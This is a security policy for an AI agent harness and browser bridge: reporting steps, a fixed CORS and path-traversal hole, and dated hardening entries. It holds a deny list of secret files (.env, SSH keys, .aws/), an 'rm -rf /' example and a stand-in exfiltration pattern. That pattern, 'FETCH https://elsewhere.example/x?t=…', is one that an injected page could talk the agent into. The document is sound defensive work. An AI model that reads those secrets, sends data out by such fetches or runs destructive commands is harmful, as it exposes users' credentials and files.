# Security

This tool drives a browser that is logged into your AiPASS account. It never
reads or forwards a credential — the real request runs as ordinary page
JavaScript inside your own tab, and Chrome attaches the session cookie itself —
but anything that can reach the bridge can *spend* that account. Treat the
bridge port the way you would treat a password.

## Reporting

Open a **private security advisory** in this repository:

<https://github.com/kasemjeff/TH-aipassport-desktop/security/advisories/new>

Please do not open a normal issue for something exploitable, and do not send
reports to the upstream project: this repository is the maintained
continuation and the advisory here is the one the maintainer reads. If GitHub
advisories are not usable for you, say so in a minimal public issue **without
the details** and ask for a private channel.

The targets are best-effort, not a support contract: acknowledge within 3
business days, triage within 7 days, and agree a fix or mitigation timeline
after triage. Default-configuration issues ship before issues that require a
non-default setting.

### Supported versions

| version | supported |
|---|---|
| `0.2.x` | yes |
| older than `0.2` | no |

Only the latest published minor is supported with security fixes. If you are
on a source checkout, update to the latest `main` or the latest release tag.

### What to include

- the version, commit and platform (`git rev-parse --short HEAD`, OS, Node);
- whether the report needs `AIPASS_ALLOW_REMOTE`, `AIPASS_ADMIN`,
  `AIPASS_CORS_ORIGIN` or `AIPASS_REQUIRE_AUTH=0` to reproduce;
- a minimal reproduction without real credentials, tokens or private project
  data.

The process, as small as the project:

1. **Triage asks the configuration question first.** Does the report need
   `AIPASS_ALLOW_REMOTE`, `AIPASS_ADMIN`, `AIPASS_CORS_ORIGIN` or
   `AIPASS_REQUIRE_AUTH=0` to matter? A default-configuration hole ships
   before a non-default one — both get fixed.
2. **A fix lands with its test.** Every closed hole carries a regression
   test in the same change — code, a `SECURITY.md` bullet, tests that pin
   the refusal; the hardening bullets below all follow that shape.
3. **Verify closure.** The regression test is the proof; the `CHANGELOG.md`
   `[Unreleased]` line names the behavior change (no exploit walkthrough
   before users can update); the advisory closes naming the fixed tag.
4. **Announce when copies are affected** — like the pre-2-Sep notice below,
   because a fix without a notice leaves old clones running the hole.

## Inherited upstream history

The section below is kept from the upstream project for context. This
repository's first import already contains the fix; it is not a list of open
holes. It stays here because the incident is part of the security record and
because a fork of an old upstream checkout may still be affected.

## If you cloned or forked before 2 Sep 2026

**Update.** Every upstream copy taken before commit
[`8cad676`](https://github.com/niawjunior/aipass-bridge/commit/8cad676)
(2026-09-02, 21:55 +07) has a bridge that any website could drive.

The bridge answered every request with `access-control-allow-origin: *` and
`access-control-allow-private-network: true` — the second being exactly the
opt-in Chrome's Private Network Access check requires before a public page may
reach `127.0.0.1` — with no authentication and no `Host` validation. Any page you
had open in that browser could therefore:

- send messages on your AiPASS account and read the replies,
- list your conversation titles,
- read any `*.log` file the process could open, through a path traversal in `/logs`,
- kill the browser, restart the bridge, and reload the extension.

Binding to `127.0.0.1` did not help: the path in was the browser, not the network.

Fixed in [#5](https://github.com/niawjunior/aipass-bridge/pull/5):

- CORS is **off** by default. The CLIs ignore CORS and the extension reaches the
  bridge with host-permission privilege, so neither ever needed it. Set
  `AIPASS_CORS_ORIGIN` only if you deliberately want a browser page to call it.
- The `Host` header is validated against a loopback allowlist, which closes DNS
  rebinding.
- The process-control routes (`/logs`, `/restart`, `/browser/restart`,
  `/ext/reload`, `/tab/reload`) are off unless `AIPASS_ADMIN=1`, which the Docker
  deployment sets and a laptop does not.
- The `/logs` name is allowlisted rather than interpolated.

```bash
git pull                      # a clone
# a fork: merge upstream/main, or re-fork
```

Then restart the bridge and reload the extension.

## Running it safely

- **Keep the bridge on `127.0.0.1`.** Everything except the health probes now
  requires the loopback bearer token (below), so a leaked port alone is no
  longer enough — but port plus token still is.
- **Do not expose the noVNC desktop.** In the headless deployment it is a live
  view of a browser logged into your account. Reach it over an SSH tunnel; if you
  must expose it, set a strong `noVNC_PASSWORD` first.
- **Do not set `AIPASS_CORS_ORIGIN` to `*`.** That reopens exactly the hole above.
- **`AIPASS_ADMIN=1` grants process control** to anything that can reach the port.
  It exists for the container.
- **Secret files never reach the model** (hardened Oct 2026, `harness/settings.mjs`
  `SECRET_RULES` + `harness/permissions.mjs`): `.env*`, `*.pem`/`*.key`/`*.p12`,
  `id_rsa*`/`id_ed25519*`, `credentials.json`, `.aws/`, `.gnupg/`, `*.har` and
  `aipass*.md` captures are denied for reads AND writes in every mode, yolo
  included. An explicit user rule naming the same file still wins (operator
  override), and `kinds` narrowing keeps its documented meaning (H9). The
  WAF-encoded spelling (`DOT-ENV`) is decoded before the check, so
  obfuscation is not a bypass. The same floor now covers the execution
  channels (`harness/permissions.mjs` `secretHit` + `harness/tools.mjs`): a
  RUN whose command spells a secret path is refused before anything spawns,
  SEARCH skips secret files even when their names are not dot-hidden
  (`server.pem`, `id_rsa`), and git patches (`diff` / `show` / `log -p`) drop
  any chunk whose file is a secret and say how many were dropped. What no
  screen can catch is a command that builds the name at runtime (`node -e`
  tricks) — that is arbitrary code, `--allow-run` is the gate, and ask mode
  shows every command before it runs.
- **A command's OUTPUT is screened too** (`harness/output-scrub.mjs`): the
  screen above looks at the command and at the files it names, but a command
  can also PRINT a credential — `set`/`env` prints the whole environment, and
  that environment is what the transcript carries upstream. Known token shapes
  (`sk-…`, `ghp_…`, `AKIA…`, `Bearer …`) and any assignment whose name says
  it carries a credential (`API_KEY=…`, `GITHUB_TOKEN=…`, `?_authToken=…`)
  are replaced with `[redacted]` before the output enters the transcript. The
  command still ran; the value does not leave.
- **The bridge refuses to bind off-loopback** (`bridge/server.mjs`): setting
  `AIPASS_HOST` to anything but `127.0.0.1`/`localhost`/`::1` without
  `AIPASS_ALLOW_REMOTE=1` exits instead of listening with no auth.
- **The clients send the loopback token to loopback and nowhere else**
  (hardened Oct 2026, `harness/authtoken.mjs` `isLoopbackUrl`). The question
  is about the HOST, not about a string prefix: every client built its URL as
  `${BRIDGE}${path}`, so "does this URL start with the bridge URL" was true by
  construction and a remote `--bridge` shipped the token there. The token is
  the cross-boundary credential — it is what stops another OS user, a
  sandboxed app and a browser page — so it stays on the machine.
- **The desktop backend answers a malformed request instead of dying**
  (hardened Oct 2026, `harness/rpc.mjs`). The URL was parsed as the first
  statement of an async listener, before the locality check: a malformed
  request target threw, the rejection became an unhandled rejection, and the
  process-level handler exited the backend. One request was enough, from any
  local process and from any web page (a plain GET needs no preflight). It now
  answers 400.
- **A session handle is a handle, not a path** (hardened Oct 2026,
  `harness/session.mjs` `resolveFile`). An id carrying a separator used to be
  used as a raw path, so `session.delete` deleted whatever it named and
  `session.rename` rewrote its first line. A handle may only name a file
  inside the store, checked with `path.relative` — a string prefix would also
  match a sibling whose name merely begins with the store's.
- **A path is a handle too, and it is held to the same rule** (hardened Oct
  2026, `harness/session.mjs` `resolveFile` + `foreignFor`). The window
  lists sessions with their absolute path, so a path is a legitimate handle —
  and the guard that refused another project's session only recognised the
  *id* spelling. A path to another project's session was accepted: it opened,
  it was renamed, it was deleted. A path names a session at least as precisely
  as an id does, so it is asked the same question, and the refusal names the
  project it belongs to.
- **The directory is a bucket, not a boundary** (hardened Oct 2026,
  `harness/session.mjs` `list`/`resolveFile`/`reassign`). A session lives in
  a directory named after its project's path, and that name is a lossy slug:
  `C:\a b` and `C:\a-b` are the same slug, and a long path is cut at 60
  characters. Two projects could therefore share one directory, and each
  picker showed the other's conversations. The header's own `root` is the
  authority on which project a session belongs to now: the picker, the
  handle and the relocation all ask the file, not the folder it sits in.
- **A session id is a file name, so it is a real one** (hardened Oct 2026,
  `harness/session.mjs`). It was eight hex digits of `Math.random()` — 32
  bits — and a collision was not a key that got refused: `writeFileAtomic`
  replaced the session that was there, and the whole conversation was gone
  without a word. 48 bits from the crypto module, and a collision can no
  longer destroy anything.
- **The suite never touches your bridge port** (hardened Oct 2026,
  `aipass-bridge/test/harness.mjs`). The suite turns the no-token escape hatch
  on for its own bridges, and a CLI the suite runs auto-starts a bridge —
  DETACHED, with the environment inherited. That bridge bound the developer's
  real port 8787 with the token gate off and outlived the run, because its pid
  landed in the suite's scratch home where `aipass stop` could not reach it: an
  unauthenticated bridge squatting the real port, which any web page could
  blind-POST to. The suite now names a port of its own and ends any bridge it
  started.
- **The shared port needs the token** (hardened Oct 2026,
  `bridge/server.mjs`). `AIPASS_REQUIRE_AUTH=0` on the DEFAULT port 8787 is
  refused: a cross-origin "simple" request needs no preflight, so the browser
  sends it and the bridge acts on it, and the port is the only thing a web
  page can guess. The no-token mode is for a foreground `aipass dev` and for
  the test suite, and neither wants the shared port — on any other port it is
  fine (`AIPASS_ALLOW_INSECURE_DEFAULT_PORT=1` says it on purpose).
- **A fetch is a question, not a read** (hardened Oct 2026,
  `harness/permissions.mjs` `EXFIL_KINDS`). FETCH is the one tool whose
  DESTINATION the model chooses: the URL is its own, the query string is its
  own, and `NEED file` followed by `FETCH https://elsewhere.example/x?t=…` is
  a complete exfiltration channel — one a page the agent read could talk it
  into. It is a tier of its own and no mode pre-answers it, yolo included; the
  window asks and shows the URL. The CLI has no window to ask in, so
  `--allow-fetch` is the consent there, the way `--allow-run` is for the
  shell. WEB and ATTACH are not in the tier: WEB goes to the product's own
  search and ATTACH to the provider that already receives the whole
  conversation, and neither lets the model pick where the data lands.
- **A repository cannot start a program on your machine** (hardened Oct 2026,
  `harness/mcp.mjs`). A project-scoped `.aipass/mcp.json` used to be spawned
  the moment the project was opened — no trust prompt, no allowlist, no
  sandbox, with the harness's own environment (and its credentials) handed to
  the child. A project-scoped server now runs only when its name is in the
  `approved` list of the HOME `mcp.json` (the one file a repository cannot
  write), it may not declare itself `read` (a repo file cannot talk itself
  into the tier that never asks), and its child receives only the variables
  its own config names.
- **A "disabled" plugin does not run** (hardened Oct 2026,
  `harness/plugins.mjs`). The enabled-list was checked AFTER the dynamic
  import, so a disabled plugin's top-level code had already run — and that
  is where a plugin does its damage. The list is read first now, so the file
  is never imported.
- **A remembered "always" is not a blanket** (hardened Oct 2026,
  `harness/rules.mjs` `commandShape`, `harness/permissions.mjs`). A RUN
  carries its command in its body and an empty argument, so the grant key was
  the constant `run:` — one "always" on `ls -la` authorised `rm -rf /` after
  it, in that run and in every run after it. A shell grant is keyed by the
  command's SHAPE now (the program, and the word that decides what it does):
  `git status` does not cover `git push`, and a grant written before the
  shape existed answers nothing — the safe reading of "always allow every
  command" is "ask again".
- **`auto` asks about the shell** (hardened Oct 2026,
  `harness/permissions.mjs`). The documented meaning of `auto` is "writes go
  through without asking"; the code let `auto` + `allowRun` run every shell
  command silently. `yolo` is the mode that lets the shell through.
- **The private-address guard is pinned to the connection** (hardened Oct
  2026, `bridge/private-hosts.mjs` `pinnedGet`). The guard resolved the name
  and vetted the answer, then `fetch` resolved it AGAIN — so a name with
  TTL=0 could answer public for the check and private for the request. The
  address that was vetted is now the address the socket goes to, the verdict
  cache is short, and the classifier knows the CGNAT, protocol-assignment,
  benchmarking and reserved ranges as well as the IPv4-compatible and NAT64
  IPv6 forms.
- **Bridge logs are scrubbed** (`bridge/log-scrub.mjs` `scrubSecrets`): `sk-…`,
  `xox…`, `ghp/gho_…`, `AKIA…`, `AIza…` and `Bearer …` shapes are replaced
  with `[redacted]` before they reach stdout/`bridge.log`. Sessions on disk
  intentionally keep your own text verbatim — treat `~/.aipass/sessions` as
  sensitive and delete it when you decommission a machine.
- **The desktop window runs under a CSP.** The policy is served by the backend
  (`harness/rpc.mjs`, `WINDOW_CSP`) and declared in
  `desktop/src-tauri/tauri.conf.json`; a test says the two are the same
  policy, key for key, because the window is loaded FROM the backend over
  plain HTTP — the header the backend sends is the one that binds, and the
  shell's declaration covers the asset protocol, which this window does not
  use. Scripts come from the app itself (no inline, no eval), `object-src`
  and `form-action` are locked down, the window cannot be framed, and
  `connect-src` is the backend itself — the page is served from it, so
  `'self'` names exactly the one loopback origin it may talk to. The
  Tauri capability set is window + event only (no fs/shell/http/tray/menu),
  the page gets no `window.__TAURI__` at all, the installer no longer ships
  the developer test suite, and the Chrome extension's host access is the
  aipass origin plus the loopback bridge — verified by tests so it cannot
  quietly re-broaden.
- **An "always" answer is not a permanent yes.** The permission engine
  checks the user's own path rules and the secret floor BEFORE the remembered
  grants: a `deny` rule the person wrote after the grant wins over it, and a
  secret file stays denied in every mode whatever the answer was once. The
  grant still beats the safety floor and the mode — "always" means always
  (`harness/permissions.mjs`, `test/permissions.test.mjs`).
- **Every route needs the loopback bearer token** (Oct 2026,
  `harness/authtoken.mjs`): a 256-bit token is minted once to `~/.aipass/.token`
  (owner-only intent) and required on the bridge (8787) and the desktop
  backend (8790) for everything except `/status`/`/health`. The extension popup
  stores it once; the CLI, the desktop backend and the harness's own bridge
  client read the file themselves and present it to the bridge (to loopback and
  nowhere else); the window bootstraps it from a same-origin-only `/token`
  endpoint. `AIPASS_TOKEN` overrides, `AIPASS_REQUIRE_AUTH=0` disables (with a
  boot warning).
- **Plugins and MCP servers are trusted, not sandboxed** (Oct 2026,
  `harness/install.mjs`, `harness/mcp.mjs`): installing a plugin, or adding an
  MCP server, means running someone else's code in the backend process with the
  app's rights — which is why install is the consent moment. `aipass plugin
  inspect` (and the window's install box) prints size and sha256 **without
  executing anything**; staging copies are validated only after that report is
  confirmed (`--yes` exists for scripts and still prints the trust sentence),
  and validation *is* the first execution. The recorded hash is **provenance,
  not protection**: it answers "did this change since it behaved?", while the
  stops remain the file system, the permission gate and the person. A plugin
  **marker** rides that gate like a built-in: the `risk` it declared at
  registration is taken as given, and a marker that declared none is
  classified like a **write** — a plugin's code runs in the backend process
  with the app's rights, so silence is not a declaration of trust. The
  person's own path rules and the secret floor reach a marker through its
  argument, and the payload the argument does not carry (the body) is screened
  for secret names as well, because a plugin used as a proxy would carry the
  file straight back to the model and the plugin's own code cannot be screened
  from here (`harness/permissions.mjs#classifyPlugin`, `harness/loop.mjs`).
  MCP tools
  carry their server's declared `risk` (default `"write"`) into the same
  verdict a built-in of that kind faces — an MCP filesystem server may write,
  and in ask mode it is asked about; `"read"` is the operator's trust statement,
  not a verification. `env` values in `mcp.json` are secret-class: never
  rendered back (`KEY = •••••`), never logged, the file written owner-only, and
  a removed server takes its values with it. Nothing in the install path ever
  deletes: a replaced or removed copy moves to `.trash/`, and an unmanaged file
  or folder needs an explicit `--force` to be touched at all.
- **The session and upload stores are owner-only where the OS has modes**
  (`harness/session.mjs`, `harness/settings.mjs`): the sessions directory, its
  per-project directories and every session file are created 0o700/0o600, a
  file an older build left readable is tightened when it is opened, and staged
  upload copies match — the sensitive store no longer hinges on the ambient
  umask. Windows keeps its profile ACL, and the same-user limit under "Known
  limits" applies there too.
- **`browser.open` can no longer run a shell** (`harness/rpc.mjs`): the URL is
  allowlisted to `http(s)` and passed as argv through `execFile` — quotes,
  whitespace and shell punctuation are refused. The desktop shell's window
  opener follows the same argv rule.
- **The FETCH tool shares the attachment guard**
  (`harness/tools.mjs` + `bridge/private-hosts.mjs`): literal-IP and DNS-based
  private-address checks run on every redirect hop, in one classifier module so
  the two paths cannot drift.
- **Staged attachments are capped and owned** (`harness/rpc.mjs`): a path stage
  enforces the 20 MB cap before reading the file; dropping a staged reference
  deletes only backend-made copies, never the user's original file.
- **A dead socket drops its client, not the process**: every SSE write and
  keepalive (bridge and desktop backend) is guarded, and a job whose client
  socket died fails immediately instead of leaking until its idle timeout.
- **The WAF table has one owner** (`harness/waf.mjs`): the chat CLI's forked
  copy — already diverged — is gone, and a run pins its own conversation id
  (`harness/harness.mjs`), so surfaces cannot drift and runs cannot cross-talk.

## Data classes

Three classes, one rule each:

- **The repository (public):** code, docs and fixtures. Never secrets —
  `*.har` and `aipass*.md` captures are git-ignored for exactly this reason.
- **The machine store, `~/.aipass/` (sensitive):** sessions (your text
  verbatim), uploads, logs and eval rows. Copyable and deletable by category
  (`docs/DATA_FORMATS.md`); treat it like a drawer of documents, not a cache.
- **Secrets (never read by the model):** anything matching the
  `SECRET_RULES` floor above, plus `~/.aipass/.token`. The token is a
  credential: same-user processes can read it — the boundary is other users,
  sandboxed apps and browser pages.

## Updates

The app checks a **signed feed** to learn what is out there. This is the
part of the app that a hostile release host could attack, so it is worth
being exact about what stands between a compromised host and your machine.

- **The feed is signed.** ed25519, verified with `node:crypto` — a builtin,
  so the check costs no dependency. The **public** half is in
  `aipass-bridge/harness/update-keys.mjs`, in the source; the private half is
  a release secret and has never been in git. A feed that does not verify is
  refused and is not cached, and the app keeps using the feed it verified
  earlier. A feed is not allowed to carry its own keys: a feed that could
  introduce a key would be a feed that could be replaced wholesale.
- **The pack's hash is inside that signed feed**, so "the download matches
  itself" is never the check — the check is "the download matches what the
  release key signed". Every file in the pack carries its own hash too, and
  a pack that names a path outside the tree is refused.
- **The sequence number goes one way.** An old signed feed replayed at you
  is refused, so a captured feed cannot pull the app back to an old build.
- **Nothing is applied on its own.** The content is replaced when a person
  clicks, and never while a run is in flight. The shell — the binary — is
  replaced by the installer, and only when a person clicks that too.
- **The handover refuses an unsigned installer.** The feed records each
  artifact's signature state, and the feed is signed — so the gate opens
  only when the release key says the artifact is signed. The Windows
  installer is unsigned today, so the path is closed; it is not a flag in a
  settings file that anything can turn on. **An unsigned app that
  downloads and runs an unsigned installer is the worm shape**, and that is
  why the handover is gated rather than merely documented.
- **The shell checks the artifact again before it runs it.** The backend
  verifies the download against the signed feed; the shell then hashes the
  file on disk — with the app's own Node, `node:crypto` being a builtin —
  and refuses to start anything whose hash is not the one it was handed. The
  command that names the artifact names a **file**, not a path: the shell
  builds the path itself, inside its own downloads directory.
- **The check sends nothing about the machine.** It is one GET of a static
  file from a pinned URL. No identifier, no telemetry.
- **The content lives in `~/.aipass/app/`, beside your data.** A local
  process that can write into `~/.aipass` can already get code execution
  through the app — the plugin directory holds code the harness loads and
  runs — so the update system's own directory does not raise that ceiling.
  It does not lower it either: the app's feed URL is compiled in, not a
  setting, so a tampered `settings.json` cannot point the app at somebody
  else's feed.

## Owners

- **Data:** whoever runs the install — single-user by design, and nothing
  phones home, so there is no one else to ask.
- **System and changes:** the maintainer (`LICENSE`); a release requires the
  acceptance checklist and the tagged approver named in `docs/RELEASE.md`.
- **Security reports:** the maintainer, through the advisory channel above.
- **Legal:** the code is MIT. Using it spends *your* deAiPASS account through
  *your* browser session — the account's terms apply, and every message
  enters its chat history ("Known limits" below). Eval fixtures are
  synthetic; importing a public dataset waits on license review
  (`docs/SPEC_EVALS.md`).

## Threat model

The model is treated as an **untrusted author, not an attacker behind an OS
boundary**: the worst case taken seriously is writing files and running what
it was allowed to run (`docs/TECH_STACK.md` on rejected containerisation).
The boundary is the permission floor, the overlay and the loopback token —
not a sandbox. Reviewed each hardening round (the dated entries above): a
new finding gets a dated bullet here and a regression test in the same
change. The honest residuals are the "Known limits" below.

## Known limits, not bugs

- Every message appears in your account's chat history. This drives the real
  product.
- The agent's `--allow-run` executes shell commands in the project root. It is off
  by default for that reason.
- `RUN` runs on this machine's terms: a 120-second cap per command, 10 MB of
  captured output, no CPU or memory cage, and the sandbox (when edits are
  staged) is a projection for honest checks, not a jail. The projection is a
  copy of your project with the staged edits in it, and the heavy directories
  (`node_modules`, `dist`, …) are SHARED with the real tree rather than
  copied — a write into one of them lands in your project, and the command's
  result says which folders are shared. The projection lives under
  `~/.aipass/run/`, outside the project, so it cannot be committed by
  accident. Network access is
  not filtered — FETCH's private-address guard does not apply to a shell
  command.
- Remote image URLs are fetched server-side behind a private-address guard. The
  guard understands IPv4 in every spelling the URL parser leaves (integer, hex,
  octal and IPv4-mapped IPv6 forms), re-checks every redirect hop, and since
  Oct 2026 connects to the address it vetted rather than resolving the name a
  second time — it also knows the CGNAT, protocol-assignment, benchmarking and
  reserved ranges, and the IPv4-compatible and NAT64 IPv6 forms. It fails
  CLOSED for a fetch (a name that cannot be vetted is not fetched); the
  resolver helper the link-following path uses still fails open when DNS
  itself is unreachable — still, do not point it at URLs you do not trust.
- The loopback token file (`~/.aipass/.token`) is readable by your OS user: any
  process already running as you can read it — and could read your sessions
  anyway. The token stops other users, sandboxed apps and browser pages, not
  same-user malware.
